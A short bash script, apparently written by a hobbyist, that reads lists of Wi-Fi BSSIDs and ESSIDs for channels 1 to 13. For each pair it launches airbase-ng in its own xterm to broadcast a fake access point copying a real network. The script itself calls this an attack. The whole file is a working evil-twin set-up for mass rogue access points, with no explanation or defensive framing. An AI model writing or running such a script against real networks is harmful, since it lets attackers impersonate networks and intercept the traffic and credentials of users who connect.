#!/bin/bash

echo ""
echo "put youre interface name in monitor mode in the next input"
                                        read -p "└─────►$(tput setaf 7) " interfaceMon

for chann in {1..13}; do

file="APs$chann.txt"
names="Names$chann.txt"

echo ""
echo "Procesing files for channel $chann..."
echo "file: $file"
echo "names: $names"
echo ""
if [ -f "$file" ] && [ -f "$names" ]; then

echo "Both files exist. Resuming with attack setup..."

while IFS= read -r target <&3 && IFS= read -r targetName <&4; do

echo "Procesing target: $target with ESSID: $targetName"

if [ -n "$target" ] && [ -n "$targetName" ]; then

echo "Valid BBSID and ESSID found. Launching Attack Tools..."

sudo xterm -e airbase-ng -a $target -e $targetName -c $chann $interfaceMon &
        else 
    echo "BSSID O ESSID no valid: $target, $targetName"
        fi
    done 3<"$file" 4<"$names"
else
echo "the file $file or $names doesnt exist"
fi

done